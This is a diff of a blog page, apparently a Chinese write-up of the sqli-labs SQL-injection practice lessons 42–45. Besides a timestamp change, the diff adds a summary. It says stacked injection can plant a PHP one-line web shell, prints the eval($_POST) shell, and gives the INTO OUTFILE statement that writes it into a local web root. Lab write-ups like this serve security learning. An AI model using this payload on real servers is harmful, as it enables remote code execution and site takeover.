@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/4.png">
 <meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/5.png">
 <meta property="article:published_time" content="2021-02-22T08:10:00.000Z">
-<meta property="article:modified_time" content="2021-02-22T11:14:03.053Z">
+<meta property="article:modified_time" content="2021-02-22T11:45:38.984Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/1.png">
@@ -113,6 +113,17 @@
 <h1>Less-45</h1>
 
 <p>和Less-44一样，只是注入字符改成’)。</p>
+<h1>小结</h1>
+这部分和上一部分一样是堆叠注入，堆叠注入可以用来注入一句话木马：<br>
+php一句话木马：\<?php @eval($_POST[crow]);?\><br>
+绝对路径： E:\PhpStudy2018\PHPTutorial\WWW\<br>
+使用函数： select xxx into  outfile xxx<br>
+select '\<?php @eval($_POST[crow]);?\>' into outfile 'E:\\PhpStudy2018\\PHPTutorial\\WWW\\test.php';<br>
+
+
+
+
+
 
       
     </div>
